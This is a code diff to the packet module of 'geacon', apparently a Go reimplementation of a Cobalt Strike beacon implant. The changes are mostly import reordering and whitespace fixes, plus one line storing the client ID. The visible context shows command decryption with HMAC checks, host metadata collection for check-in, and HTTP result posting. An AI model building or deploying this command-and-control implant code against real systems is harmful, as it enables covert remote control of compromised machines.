@@ -2,8 +2,8 @@ package packet
 
 import (
 	"bytes"
-	"crypto/sha256"
 	"crypto/hmac"
+	"crypto/sha256"
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
@@ -11,12 +11,12 @@ import (
 	"geacon/cmd/crypt"
 	"geacon/cmd/sysinfo"
 	"geacon/cmd/util"
+	"io/ioutil"
+	"math/rand"
+	"net/http"
 	"strconv"
 	"strings"
 	"time"
-	"math/rand"
-	"io/ioutil"
-	"net/http"
 )
 
 var (
@@ -48,7 +48,6 @@ func ReadInt(b []byte) uint32 {
 func ReadLittleInt(b []byte) uint32 {
 	return binary.LittleEndian.Uint32(b)
 }
-
 
 func ReadShort(b []byte) uint16 {
 	return binary.BigEndian.Uint16(b)
@@ -82,7 +81,7 @@ func DecryptPacket(b []byte) ([]byte, bool) {
 	// if the data length is greater than 0, then we received a command!
 	// Otherwise, it is just an acceptance of our checkin request, and as such does not contain a command nor an HMAC
 	if len(decrypted) > 0 {
-			// last 16 Bytes are the HMAC 
+		// last 16 Bytes are the HMAC
 		// hmacHash := decrypted[:len(decrypted)-crypt.HmacHashLen]
 		hmacHash := decrypted[len(decrypted)-crypt.HmacHashLen:]
 
@@ -237,6 +236,7 @@ func MakeMetaInfo() []byte {
 	fmt.Printf("HMAC KEY: %v\n", config.HmacKey)
 
 	clientID = sysinfo.GeaconID()
+	config.GeaconId = clientID
 	processID := sysinfo.GetPID()
 	//for link SSH, will not be implemented
 	sshPort := 0
@@ -261,7 +261,6 @@ func MakeMetaInfo() []byte {
 		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
 		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
 	}
-
 
 	//for Smart Inject, will not be implemented
 	ptrFuncAddr := 0
@@ -373,7 +372,7 @@ func PushChainResult(chainClientId int, b []byte) *http.Response {
 
 func mask(b []byte) []byte {
 	key := make([]byte, 4)
-    rand.Read(key)
+	rand.Read(key)
 	data := make([]byte, len(b))
 	// fmt.Printf("Length of key is %d \nLength of data is %d \n", len(key), len(b))
 
@@ -387,7 +386,7 @@ func mask(b []byte) []byte {
 
 	// fmt.Printf("Data masked: %x \n", data)
 
-	result := make([]byte, len(key) + len(data))
+	result := make([]byte, len(key)+len(data))
 	result = append(key, data...)
 	return result
 }
